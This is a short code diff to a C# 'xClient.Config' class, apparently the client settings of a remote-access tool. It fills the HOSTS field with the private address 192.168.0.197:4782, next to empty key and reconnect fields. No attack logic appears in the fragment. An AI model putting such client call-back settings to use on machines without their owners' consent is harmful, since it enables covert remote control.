@@ -37,7 +37,7 @@ namespace xClient.Config
         }
 #else
         public static string VERSION = "";
-        public static string HOSTS = "";
+        public static string HOSTS = "192.168.0.197:4782";
         public static int RECONNECTDELAY = 5000;
         public static string KEY = "";
         public static string AUTHKEY = "";
